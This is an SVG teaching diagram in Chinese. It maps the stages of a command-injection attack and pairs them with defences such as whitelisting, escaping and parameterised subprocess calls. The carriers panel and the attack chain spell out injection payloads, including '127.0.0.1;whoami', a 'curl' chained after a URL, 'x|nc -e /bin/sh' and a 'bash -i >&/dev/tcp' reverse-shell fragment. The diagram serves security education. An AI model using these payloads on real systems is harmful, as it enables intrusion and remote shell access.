<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1000 460" width="100%" font-family="PingFang SC, Microsoft YaHei, sans-serif">
  <rect width="1000" height="460" fill="#f8fafc"/>
  <defs>
    <marker id="arr" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
      <path d="M0,0 L10,5 L0,10 z" fill="#c53030"/>
    </marker>
  </defs>
  <text x="500" y="30" font-size="16" font-weight="bold" text-anchor="middle" fill="#1a202c">命令注入攻击链</text>

  <rect x="50" y="70" width="140" height="50" rx="8" fill="#fed7d7" stroke="#c53030" stroke-width="2"/>
  <text x="120" y="98" font-size="11" text-anchor="middle" fill="#c53030" font-weight="bold">① 定位注入点</text>
  <text x="120" y="115" font-size="9" text-anchor="middle" fill="#c53030">ping/路径/参数</text>

  <line x1="190" y1="95" x2="225" y2="95" stroke="#c53030" stroke-width="2" marker-end="url(#arr)"/>

  <rect x="230" y="70" width="140" height="50" rx="8" fill="#fefcbf" stroke="#b7791f" stroke-width="2"/>
  <text x="300" y="98" font-size="11" text-anchor="middle" fill="#b7791f" font-weight="bold">② 注入分隔符</text>
  <text x="300" y="115" font-size="9" text-anchor="middle" fill="#b7791f">; | && ||</text>

  <line x1="370" y1="95" x2="405" y2="95" stroke="#c53030" stroke-width="2" marker-end="url(#arr)"/>

  <rect x="410" y="70" width="140" height="50" rx="8" fill="#e9d8fd" stroke="#805ad5" stroke-width="2"/>
  <text x="480" y="98" font-size="11" text-anchor="middle" fill="#805ad5" font-weight="bold">③ 执行系统命令</text>
  <text x="480" y="115" font-size="9" text-anchor="middle" fill="#805ad5">whoami/id/curl</text>

  <line x1="550" y1="95" x2="585" y2="95" stroke="#c53030" stroke-width="2" marker-end="url(#arr)"/>

  <rect x="590" y="70" width="140" height="50" rx="8" fill="#c6f6d5" stroke="#38a169" stroke-width="2"/>
  <text x="660" y="98" font-size="11" text-anchor="middle" fill="#38a169" font-weight="bold">④ 反弹 Shell</text>
  <text x="660" y="115" font-size="9" text-anchor="middle" fill="#38a169">bash -i &gt;&amp;/dev/tcp</text>

  <line x1="730" y1="95" x2="765" y2="95" stroke="#c53030" stroke-width="2" marker-end="url(#arr)"/>

  <rect x="770" y="70" width="190" height="50" rx="8" fill="#bee3f8" stroke="#3182ce" stroke-width="2"/>
  <text x="865" y="98" font-size="11" text-anchor="middle" fill="#3182ce" font-weight="bold">⑤ 提权 / 持久化 / 横向</text>

  <rect x="40" y="150" width="450" height="270" rx="12" fill="#fff5f5" stroke="#e53e3e" stroke-width="2"/>
  <text x="265" y="175" font-size="12" font-weight="bold" text-anchor="middle" fill="#822727">常见注入载体</text>

  <text x="70" y="205" font-size="10" font-weight="bold" fill="#c53030">1. ping 命令注入</text>
  <text x="70" y="225" font-size="9" fill="#2d3748">输入: 127.0.0.1;whoami</text>
  <text x="70" y="245" font-size="9" fill="#2d3748">命令: ping -c 1 $ip → ping -c 1 127.0.0.1;whoami</text>

  <text x="70" y="270" font-size="10" font-weight="bold" fill="#805ad5">2. 文件路径注入</text>
  <text x="70" y="290" font-size="9" fill="#2d3748">输入: /tmp/shell;bash shell</text>
  <text x="70" y="310" font-size="9" fill="#2d3748">危险函数: system() / exec() / popen()</text>

  <text x="70" y="335" font-size="10" font-weight="bold" fill="#dd6b20">3. 下载/转换工具</text>
  <text x="70" y="355" font-size="9" fill="#2d3748">输入: http://x.com/x.png;curl x.c</text>
  <text x="70" y="375" font-size="9" fill="#2d3748">ffmpeg/wget/curl 拼接命令</text>

  <text x="70" y="400" font-size="10" font-weight="bold" fill="#3182ce">4. 管道符注入</text>
  <text x="70" y="415" font-size="9" fill="#2d3748">输入: x|whoami  或  x|nc -e /bin/sh</text>
  <text x="70" y="430" font-size="9" fill="#2d3748">管道符 | 优先级低但危险</text>

  <rect x="510" y="150" width="450" height="270" rx="12" fill="#f0fff4" stroke="#48bb78" stroke-width="2"/>
  <text x="735" y="175" font-size="12" font-weight="bold" text-anchor="middle" fill="#276749">防御措施</text>

  <text x="540" y="205" font-size="10" font-weight="bold" fill="#c53030">1. 参数白名单</text>
  <text x="540" y="225" font-size="9" fill="#2d3748">只允许 IP 格式 / 数字 / 预定义值</text>
  <text x="540" y="245" font-size="9" fill="#2d3748">正则: /^[\d.]+$/ 或 /^[\w-]+$/</text>

  <text x="540" y="270" font-size="10" font-weight="bold" fill="#805ad5">2. 过滤危险字符</text>
  <text x="540" y="290" font-size="9" fill="#2d3748">过滤: ; | &amp;&amp; || ` $( &quot; ' &lt; &gt;</text>
  <text x="540" y="310" font-size="9" fill="#2d3748">PHP: escapeshellcmd() / escapeshellarg()</text>

  <text x="540" y="335" font-size="10" font-weight="bold" fill="#dd6b20">3. 避免拼接命令</text>
  <text x="540" y="355" font-size="9" fill="#2d3748">使用参数化 API 而非 shell 拼接</text>
  <text x="540" y="375" font-size="9" fill="#2d3748">Python: subprocess.run(['ping','-c','1',ip])</text>

  <text x="540" y="400" font-size="10" font-weight="bold" fill="#3182ce">4. 最小权限</text>
  <text x="540" y="415" font-size="9" fill="#2d3748">Web 进程使用普通用户</text>
  <text x="540" y="430" font-size="9" fill="#2d3748">禁止 sudo / 敏感命令执行权限</text>
</svg>
